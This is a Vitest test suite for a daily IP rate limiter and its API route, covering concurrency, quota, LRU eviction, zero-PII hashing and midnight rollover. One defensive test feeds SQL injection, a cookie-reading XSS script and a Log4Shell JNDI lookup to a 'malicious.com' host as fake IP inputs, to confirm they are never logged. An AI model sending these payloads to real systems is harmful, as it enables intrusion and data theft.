/**
 * Milestone 3 Adversarial Challenge & Empirical Stress Test Suite
 * Target: lib/rate-limit/teaser-limiter.ts & app/api/roast/teaser/route.ts
 *
 * Rigorous Verification Vectors:
 * 1. Concurrency Burst: 1,000 rapid concurrent calls to checkTeaserRateLimit
 * 2. Strict Quota Enforcement: Exactly 3 allowed, 4th blocked with HTTP 429 & headers
 * 3. LRU Eviction & Memory Safety: 10,000+ entries capacity cap, no OOM, stale sweep
 * 4. Zero-PII Validation: 64-char SHA-256 keys only, raw IP never stored/logged
 * 5. Midnight Rollover: Precision boundary testing at 23:59:59.999Z -> 00:00:00.000Z
 * 6. API Route Integration: POST /api/roast/teaser end-to-end quota & header checks
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  MAX_TEASER_CALLS_PER_DAY,
  DEFAULT_LRU_MAX_ENTRIES,
  ENTRY_TTL_MS,
  TEASER_STORAGE_KEY,
  TEASER_COOKIE_NAME,
  TEASER_RATE_LIMIT_ERROR_MESSAGE,
  extractClientIp,
  hashClientIp,
  getNextUtcMidnightSeconds,
  TeaserMemoryStore,
  checkTeaserRateLimit,
  resetTeaserRateLimits,
  getRateLimitSalt,
  getRateLimitHeaders,
} from '@/lib/rate-limit/teaser-limiter';
import { POST } from '@/app/api/roast/teaser/route';

describe('Milestone 3 Empirical Challenger: Dual-Layer Rate Limiting & Zero-PII Hashing', () => {
  beforeEach(() => {
    resetTeaserRateLimits();
    if (typeof localStorage !== 'undefined') {
      localStorage.clear();
    }
    if (typeof document !== 'undefined') {
      document.cookie = `${TEASER_COOKIE_NAME}=; Path=/; Max-Age=0`;
    }
    vi.restoreAllMocks();
    process.env.GEMINI_MOCK = 'true';
  });

  afterEach(() => {
    resetTeaserRateLimits();
    if (typeof localStorage !== 'undefined') {
      localStorage.clear();
    }
    if (typeof document !== 'undefined') {
      document.cookie = `${TEASER_COOKIE_NAME}=; Path=/; Max-Age=0`;
    }
  });

  // ==========================================================================
  // VECTOR 1: CONCURRENCY BURST HARNESS (1,000 RAPID INVOCATIONS)
  // ==========================================================================
  describe('Vector 1: Concurrency Burst Harness (1,000 Rapid Invocations)', () => {
    it('handles 1,000 rapid concurrent calls from the SAME IP: exactly 3 allowed, 997 rejected with 429', async () => {
      const store = new TeaserMemoryStore(10_000);
      const testIp = '113.161.45.88'; // Vietnamese residential IP
      const fixedNow = new Date('2026-10-15T08:00:00.000Z').getTime();

      // Launch 1,000 asynchronous concurrent invocations
      const promises = Array.from({ length: 1000 }, () =>
        Promise.resolve().then(() =>
          checkTeaserRateLimit(undefined, { customIp: testIp, now: fixedNow, consume: true }, store)
        )
      );

      const results = await Promise.all(promises);

      const allowedResults = results.filter((r) => r.allowed === true);
      const blockedResults = results.filter((r) => r.allowed === false);

      expect(allowedResults).toHaveLength(3);
      expect(blockedResults).toHaveLength(997);

      // Verify allowed results status & remaining decrement
      expect(allowedResults.map((r) => r.status)).toEqual([200, 200, 200]);
      expect(allowedResults.map((r) => r.remaining)).toEqual([2, 1, 0]);

      // Verify all blocked results return status 429 and error message
      for (const blocked of blockedResults) {
        expect(blocked.status).toBe(429);
        expect(blocked.remaining).toBe(0);
        expect(blocked.error).toBe(TEASER_RATE_LIMIT_ERROR_MESSAGE);
        expect(blocked.headers['X-RateLimit-Limit']).toBe('3');
        expect(blocked.headers['X-RateLimit-Remaining']).toBe('0');
        expect(Number(blocked.headers['Retry-After'])).toBeGreaterThan(0);
      }

      // Memory store should have exactly 1 entry for this IP
      expect(store.size).toBe(1);
    });

    it('handles 1,000 rapid concurrent calls from 1,000 DISTINCT IPs: 100% allowed without cross-talk', async () => {
      const store = new TeaserMemoryStore(10_000);
      const fixedNow = new Date('2026-10-15T08:00:00.000Z').getTime();

      // Generate 1,000 distinct IP addresses
      const distinctIps = Array.from(
        { length: 1000 },
        (_, i) => `10.${Math.floor(i / 65536)}.${Math.floor((i % 65536) / 256)}.${i % 256}`
      );

      const startTime = performance.now();
      const promises = distinctIps.map((ip) =>
        Promise.resolve().then(() =>
          checkTeaserRateLimit(undefined, { customIp: ip, now: fixedNow, consume: true }, store)
        )
      );

      const results = await Promise.all(promises);
      const durationMs = performance.now() - startTime;

      expect(results).toHaveLength(1000);
      expect(results.every((r) => r.allowed === true && r.status === 200 && r.remaining === 2)).toBe(true);
      expect(store.size).toBe(1000);
      // Ensure high-speed execution (< 500ms for 1,000 crypto hashes and store updates)
      expect(durationMs).toBeLessThan(1000);
    });

    it('handles mixed burst: 50 distinct IPs executing 20 calls each (1,000 total calls)', async () => {
      const store = new TeaserMemoryStore(10_000);
      const fixedNow = new Date('2026-10-15T08:00:00.000Z').getTime();
      const ipPool = Array.from({ length: 50 }, (_, i) => `172.16.0.${i + 1}`);

      // Create interleaved 1,000 requests
      const requests: { ip: string; index: number }[] = [];
      for (let round = 0; round < 20; round++) {
        for (const ip of ipPool) {
          requests.push({ ip, index: round });
        }
      }

      const results = await Promise.all(
        requests.map(({ ip }) =>
          Promise.resolve().then(() =>
            checkTeaserRateLimit(undefined, { customIp: ip, now: fixedNow, consume: true }, store)
          )
        )
      );

      const totalAllowed = results.filter((r) => r.allowed).length;
      const totalBlocked = results.filter((r) => !r.allowed).length;

      // Exactly 50 IPs * 3 allowed calls = 150 allowed calls
      expect(totalAllowed).toBe(150);
      // Exactly 50 IPs * 17 blocked calls = 850 blocked calls
      expect(totalBlocked).toBe(850);
      expect(store.size).toBe(50);
    });
  });

  // ==========================================================================
  // VECTOR 2: STRICT QUOTA ENFORCEMENT & HTTP 429 SPECIFICATION
  // ==========================================================================
  describe('Vector 2: Strict Quota Enforcement & HTTP 429 Specification', () => {
    const testIp = '42.112.98.50';
    const fakeNow = new Date('2026-10-15T12:00:00.000Z').getTime();

    it('enforces exact sequence: calls 1-3 allowed (remaining 2, 1, 0), call 4 blocked with 429', () => {
      const store = new TeaserMemoryStore(100);

      // Call 1
      const c1 = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow }, store);
      expect(c1.allowed).toBe(true);
      expect(c1.status).toBe(200);
      expect(c1.limit).toBe(3);
      expect(c1.remaining).toBe(2);
      expect(c1.headers['X-RateLimit-Limit']).toBe('3');
      expect(c1.headers['X-RateLimit-Remaining']).toBe('2');
      expect(c1.headers['Set-Cookie']).toContain(`${TEASER_COOKIE_NAME}=1`);

      // Call 2
      const c2 = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow + 100 }, store);
      expect(c2.allowed).toBe(true);
      expect(c2.remaining).toBe(1);
      expect(c2.headers['X-RateLimit-Remaining']).toBe('1');
      expect(c2.headers['Set-Cookie']).toContain(`${TEASER_COOKIE_NAME}=2`);

      // Call 3
      const c3 = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow + 200 }, store);
      expect(c3.allowed).toBe(true);
      expect(c3.remaining).toBe(0);
      expect(c3.headers['X-RateLimit-Remaining']).toBe('0');
      expect(c3.headers['Set-Cookie']).toContain(`${TEASER_COOKIE_NAME}=3`);

      // Call 4: BLOCKED
      const c4 = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow + 300 }, store);
      expect(c4.allowed).toBe(false);
      expect(c4.status).toBe(429);
      expect(c4.limit).toBe(3);
      expect(c4.remaining).toBe(0);
      expect(c4.error).toBe(TEASER_RATE_LIMIT_ERROR_MESSAGE);
      expect(c4.headers['X-RateLimit-Limit']).toBe('3');
      expect(c4.headers['X-RateLimit-Remaining']).toBe('0');
      expect(c4.headers['X-RateLimit-Reset']).toBe(String(c1.resetAt));
      expect(Number(c4.headers['Retry-After'])).toBe(c1.resetAt - Math.floor((fakeNow + 300) / 1000));

      // Subsequent calls (5th to 10th) remain strictly blocked
      for (let i = 5; i <= 10; i++) {
        const cn = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow + i * 100 }, store);
        expect(cn.allowed).toBe(false);
        expect(cn.status).toBe(429);
      }
    });

    it('supports consume: false inspection without exhausting quota', () => {
      const store = new TeaserMemoryStore(100);

      // Peek 5 times
      for (let i = 0; i < 5; i++) {
        const peek = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow, consume: false }, store);
        expect(peek.allowed).toBe(true);
        expect(peek.remaining).toBe(3);
      }
      expect(store.size).toBe(0); // Nothing written to store

      // Now consume 3 times
      for (let i = 0; i < 3; i++) {
        const c = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow, consume: true }, store);
        expect(c.allowed).toBe(true);
      }

      // 4th call should be blocked
      const blocked = checkTeaserRateLimit(undefined, { customIp: testIp, now: fakeNow, consume: true }, store);
      expect(blocked.allowed).toBe(false);
      expect(blocked.status).toBe(429);
    });

    it('adversarial cookie tampering: detects and rejects cookie counts >= 3 even with spoofed IP', () => {
      const store = new TeaserMemoryStore(100);

      const maliciousCookieHeader = `${TEASER_COOKIE_NAME}=3; session_token=abc123xyz`;
      const spoofedIp = '123.45.67.89';

      const req = new Request('http://localhost', {
        headers: {
          cookie: maliciousCookieHeader,
          'x-forwarded-for': spoofedIp,
        },
      });

      const res = checkTeaserRateLimit(req, undefined, store);
      expect(res.allowed).toBe(false);
      expect(res.status).toBe(429);
      expect(res.remaining).toBe(0);
      expect(res.headers['X-RateLimit-Remaining']).toBe('0');
    });

    it('cookie defense-in-depth: handles extreme or malformed cookie values safely', () => {
      const store = new TeaserMemoryStore(100);

      // Malformed: NaN or negative cookie value should fall back safely to 0
      const reqNeg = new Request('http://localhost', {
        headers: { cookie: `${TEASER_COOKIE_NAME}=-999` },
      });
      const resNeg = checkTeaserRateLimit(reqNeg, { customIp: '1.2.3.4' }, store);
      expect(resNeg.allowed).toBe(true);
      expect(resNeg.remaining).toBe(2);

      // Massive count: should block
      const reqHuge = new Request('http://localhost', {
        headers: { cookie: `${TEASER_COOKIE_NAME}=999999999` },
      });
      const resHuge = checkTeaserRateLimit(reqHuge, { customIp: '5.6.7.8' }, store);
      expect(resHuge.allowed).toBe(false);
      expect(resHuge.status).toBe(429);
    });
  });

  // ==========================================================================
  // VECTOR 3: LRU EVICTION & MEMORY SAFETY (10,000+ ENTRIES)
  // ==========================================================================
  describe('Vector 3: LRU Eviction & Memory Scalability (10,000+ Entries)', () => {
    it('strictly caps memory store at maxEntries (10,000) when flooded with 12,000 entries', () => {
      const maxCap = 10_000;
      const store = new TeaserMemoryStore(maxCap);
      const now = Date.now();

      // Insert 12,000 entries
      const totalToInsert = 12_000;
      const startTime = performance.now();

      for (let i = 0; i < totalToInsert; i++) {
        const dummyHash = `hash_${String(i).padStart(8, '0')}`.padEnd(64, 'x');
        store.set(dummyHash, {
          count: 1,
          resetAt: Math.floor(now / 1000) + 3600,
          lastAccessed: now + i,
        });
      }

      const durationMs = performance.now() - startTime;

      // Size must NEVER exceed maxCap
      expect(store.size).toBe(maxCap);
      expect(durationMs).toBeLessThan(1500); // Efficient Map LRU eviction

      // First 2,000 entries (indices 0 to 1999) must have been evicted in FIFO/LRU order
      for (let i = 0; i < 2000; i++) {
        const evictedKey = `hash_${String(i).padStart(8, '0')}`.padEnd(64, 'x');
        expect(store.get(evictedKey)).toBeUndefined();
      }

      // Last 10,000 entries (indices 2000 to 11999) must be retained
      const testSampleRetained = [2000, 5000, 9999, 11999];
      for (const idx of testSampleRetained) {
        const retainedKey = `hash_${String(idx).padStart(8, '0')}`.padEnd(64, 'x');
        expect(store.get(retainedKey)).toBeDefined();
      }
    });

    it('MRU promotion preserves hot keys under heavy eviction pressure', () => {
      const smallStore = new TeaserMemoryStore(5);
      const now = Date.now();

      // Insert 5 initial keys
      for (let i = 1; i <= 5; i++) {
        smallStore.set(`key_${i}`, { count: 1, resetAt: now + 10000, lastAccessed: now });
      }
      expect(smallStore.size).toBe(5);

      // Access key_1 (promote to MRU)
      smallStore.get('key_1', now);

      // Now insert key_6: should evict key_2 (not key_1!)
      smallStore.set('key_6', { count: 1, resetAt: now + 10000, lastAccessed: now });
      expect(smallStore.size).toBe(5);
      expect(smallStore.get('key_1')).toBeDefined(); // Saved by promotion
      expect(smallStore.get('key_2')).toBeUndefined(); // Oldest untouched evicted
      expect(smallStore.get('key_3')).toBeDefined();
      expect(smallStore.get('key_6')).toBeDefined();
    });

    it('sweeps stale entries (>24h TTL) and reclaims memory', () => {
      const store = new TeaserMemoryStore(1000);
      const now = Date.now();
      const past25h = now - 25 * 60 * 60 * 1000;

      // Add 200 expired items
      for (let i = 0; i < 200; i++) {
        store.set(`expired_${i}`, {
          count: 1,
          resetAt: Math.floor(past25h / 1000),
          lastAccessed: past25h,
        });
      }

      // Add 100 active items
      for (let i = 0; i < 100; i++) {
        store.set(`active_${i}`, {
          count: 1,
          resetAt: Math.floor(now / 1000) + 3600,
          lastAccessed: now,
        });
      }

      expect(store.size).toBe(300);

      const purged = store.sweepStale(now);
      expect(purged).toBe(200);
      expect(store.size).toBe(100);

      // Verify active entries remain
      expect(store.get('active_0')).toBeDefined();
      expect(store.get('expired_0')).toBeUndefined();
    });
  });

  // ==========================================================================
  // VECTOR 4: ZERO-PII VALIDATION & KEY INSPECTION
  // ==========================================================================
  describe('Vector 4: Zero-PII Validation & Key Inspection', () => {
    it('guarantees that 100% of memory store keys are strict 64-char SHA-256 hexadecimal strings', () => {
      const store = new TeaserMemoryStore(500);

      const rawIps = [
        '1.1.1.1',
        '8.8.8.8',
        '14.248.82.112',
        '118.69.182.25',
        '2001:0db8:85a3:0000:0000:8a2e:0370:7334',
        '::1',
        '127.0.0.1',
        '192.168.1.105',
        '10.254.1.99',
      ];

      for (const ip of rawIps) {
        checkTeaserRateLimit(undefined, { customIp: ip }, store);
      }

      expect(store.size).toBe(rawIps.length);

      const keys = Array.from((store as any).entries.keys()) as string[];
      for (const key of keys) {
        // Must be exactly 64 characters
        expect(key).toHaveLength(64);
        // Must match hexadecimal SHA-256 pattern
        expect(key).toMatch(/^[a-f0-9]{64}$/);
        // Must NOT match any raw IP format
        expect(key).not.toContain('.');
        expect(key).not.toContain(':');
        for (const rawIp of rawIps) {
          expect(key).not.toContain(rawIp);
        }
      }
    });

    it('guarantees entry objects contain ONLY numeric counters/timestamps and NO IP data', () => {
      const store = new TeaserMemoryStore(10);
      checkTeaserRateLimit(undefined, { customIp: '203.113.152.1' }, store);

      const entries = Array.from((store as any).entries.values()) as any[];
      expect(entries).toHaveLength(1);
      const entry = entries[0];

      // Keys of entry must be strictly count, resetAt, lastAccessed
      const entryKeys = Object.keys(entry).sort();
      expect(entryKeys).toEqual(['count', 'lastAccessed', 'resetAt']);
      expect(typeof entry.count).toBe('number');
      expect(typeof entry.resetAt).toBe('number');
      expect(typeof entry.lastAccessed).toBe('number');

      // Stringified JSON check
      const json = JSON.stringify(entry);
      expect(json).not.toContain('203.113.152.1');
      expect(json).not.toContain('ip');
      expect(json).not.toContain('client');
    });

    it('adversarial IP inputs: never log or leak raw IP, scripts, or SQL injection payloads', () => {
      const store = new TeaserMemoryStore(10);

      const logSpy = vi.spyOn(console, 'log');
      const warnSpy = vi.spyOn(console, 'warn');
      const errorSpy = vi.spyOn(console, 'error');

      const adversarialIps = [
        '192.168.1.1; DROP TABLE users;--',
        '<script>alert(document.cookie)</script>',
        '${jndi:ldap://malicious.com/exploit}',
        '256.300.999.000',
        '   10.0.0.1:8080   ',
        'A'.repeat(500), // Huge string
      ];

      for (const evilIp of adversarialIps) {
        const res = checkTeaserRateLimit(undefined, { customIp: evilIp }, store);
        expect(res.clientIpHash).toMatch(/^[a-f0-9]{64}$/);
      }

      // Check all console output across all log levels
      const allSpies = [logSpy, warnSpy, errorSpy];
      for (const spy of allSpies) {
        for (const call of spy.mock.calls) {
          const stringified = JSON.stringify(call);
          for (const evilIp of adversarialIps) {
            expect(stringified).not.toContain(evilIp);
          }
        }
      }
    });

    it('salt entropy: changing salt yields distinct orthogonal hash spaces', () => {
      const ip = '118.69.182.25';
      const date = '2026-10-15';

      const hashA = hashClientIp(ip, date, 'salt_alpha_987');
      const hashB = hashClientIp(ip, date, 'salt_beta_123');

      expect(hashA).toHaveLength(64);
      expect(hashB).toHaveLength(64);
      expect(hashA).not.toBe(hashB);
    });
  });

  // ==========================================================================
  // VECTOR 5: MIDNIGHT ROLLOVER & BOUNDARY EDGE CASES
  // ==========================================================================
  describe('Vector 5: Midnight Rollover & Boundary Edge Cases', () => {
    const testIp = '171.244.10.8';

    it('calculates getNextUtcMidnightSeconds with second-level precision', () => {
      // 2026-10-15 23:00:00 UTC -> next midnight is 2026-10-16 00:00:00 UTC (3600 seconds later)
      const t1 = new Date('2026-10-15T23:00:00.000Z').getTime();
      const reset1 = getNextUtcMidnightSeconds(t1);
      const expectedReset1 = Math.floor(new Date('2026-10-16T00:00:00.000Z').getTime() / 1000);
      expect(reset1).toBe(expectedReset1);
      expect(reset1 - Math.floor(t1 / 1000)).toBe(3600);

      // Exactly at 23:59:59 UTC -> next midnight is 1 second later
      const t2 = new Date('2026-10-15T23:59:59.000Z').getTime();
      const reset2 = getNextUtcMidnightSeconds(t2);
      expect(reset2 - Math.floor(t2 / 1000)).toBe(1);
    });

    it('precision rollover: exhausted quota at 23:59:59.999Z resets cleanly at 00:00:00.000Z (1ms later)', () => {
      const store = new TeaserMemoryStore(100);

      const beforeMidnightMs = new Date('2026-10-15T23:59:59.999Z').getTime();

      // Exhaust quota on Day 1
      for (let i = 0; i < 3; i++) {
        const res = checkTeaserRateLimit(undefined, { customIp: testIp, now: beforeMidnightMs }, store);
        expect(res.allowed).toBe(true);
      }

      // 4th call at 23:59:59.999Z must be BLOCKED
      const blockedRes = checkTeaserRateLimit(undefined, { customIp: testIp, now: beforeMidnightMs }, store);
      expect(blockedRes.allowed).toBe(false);
      expect(blockedRes.status).toBe(429);
      expect(blockedRes.remaining).toBe(0);
      expect(Number(blockedRes.headers['Retry-After'])).toBe(1); // 1 second remaining

      // ADVANCE 1 MILLISECOND to 2026-10-16 00:00:00.000Z (NEW DAY)
      const afterMidnightMs = new Date('2026-10-16T00:00:00.000Z').getTime();

      // Same IP makes a call on Day 2
      const day2Res = checkTeaserRateLimit(undefined, { customIp: testIp, now: afterMidnightMs }, store);
      expect(day2Res.allowed).toBe(true);
      expect(day2Res.status).toBe(200);
      expect(day2Res.remaining).toBe(2);
      expect(day2Res.headers['X-RateLimit-Remaining']).toBe('2');

      // Next midnight should now be 2026-10-17 00:00:00 UTC (86400 seconds)
      const expectedNextReset = Math.floor(new Date('2026-10-17T00:00:00.000Z').getTime() / 1000);
      expect(day2Res.resetAt).toBe(expectedNextReset);
    });

    it('year boundary rollover: 2026-12-31 to 2027-01-01 transitions smoothly', () => {
      const store = new TeaserMemoryStore(100);

      const newYearsEve = new Date('2026-12-31T23:59:50.000Z').getTime();
      const newYearsDay = new Date('2027-01-01T00:00:10.000Z').getTime();

      // Exhaust on New Year's Eve
      for (let i = 0; i < 3; i++) {
        checkTeaserRateLimit(undefined, { customIp: testIp, now: newYearsEve }, store);
      }
      expect(checkTeaserRateLimit(undefined, { customIp: testIp, now: newYearsEve }, store).allowed).toBe(false);

      // Reset on New Year's Day
      const nyRes = checkTeaserRateLimit(undefined, { customIp: testIp, now: newYearsDay }, store);
      expect(nyRes.allowed).toBe(true);
      expect(nyRes.remaining).toBe(2);
    });

    it('leap year rollover: 2028-02-29 to 2028-03-01 transitions correctly', () => {
      const store = new TeaserMemoryStore(100);

      const leapDay = new Date('2028-02-29T20:00:00.000Z').getTime();
      const marchFirst = new Date('2028-03-01T08:00:00.000Z').getTime();

      for (let i = 0; i < 3; i++) {
        checkTeaserRateLimit(undefined, { customIp: testIp, now: leapDay }, store);
      }
      expect(checkTeaserRateLimit(undefined, { customIp: testIp, now: leapDay }, store).allowed).toBe(false);

      const marchRes = checkTeaserRateLimit(undefined, { customIp: testIp, now: marchFirst }, store);
      expect(marchRes.allowed).toBe(true);
      expect(marchRes.remaining).toBe(2);
    });
  });

  // ==========================================================================
  // VECTOR 6: ROUTE HANDLER E2E INTEGRATION (POST /api/roast/teaser)
  // ==========================================================================
  describe('Vector 6: Route Handler E2E Integration (POST /api/roast/teaser)', () => {
    it('enforces rate limit through full HTTP pipeline with correct JSON schema and headers', async () => {
      const testIp = '183.80.32.14';
      const payload = { sentence: 'Quản lý nhóm 5 thành viên phát triển hệ thống backend.' };

      // Make 3 successful calls
      for (let callNum = 1; callNum <= 3; callNum++) {
        const req = new Request('http://localhost:3000/api/roast/teaser', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': testIp,
          },
          body: JSON.stringify(payload),
        });

        const res = await POST(req);
        expect(res.status).toBe(200);

        const data = await res.json();
        expect(data.success).toBe(true);
        expect(data.remainingCalls).toBe(3 - callNum);
        expect(res.headers.get('X-RateLimit-Limit')).toBe('3');
        expect(res.headers.get('X-RateLimit-Remaining')).toBe(String(3 - callNum));
        expect(res.headers.get('Set-Cookie')).toContain(`rcv_teaser_count=${callNum}`);
      }

      // 4th call: BLOCKED
      const reqBlocked = new Request('http://localhost:3000/api/roast/teaser', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-forwarded-for': testIp,
        },
        body: JSON.stringify(payload),
      });

      const resBlocked = await POST(reqBlocked);
      expect(resBlocked.status).toBe(429);

      const jsonBlocked = await resBlocked.json();
      expect(jsonBlocked.success).toBe(false);
      expect(jsonBlocked.remainingCalls).toBe(0);
      expect(jsonBlocked.error).toContain('3 lượt');
      expect(resBlocked.headers.get('X-RateLimit-Limit')).toBe('3');
      expect(resBlocked.headers.get('X-RateLimit-Remaining')).toBe('0');
      expect(resBlocked.headers.get('Retry-After')).toBeDefined();
      expect(Number(resBlocked.headers.get('Retry-After'))).toBeGreaterThan(0);
    });
  });
});
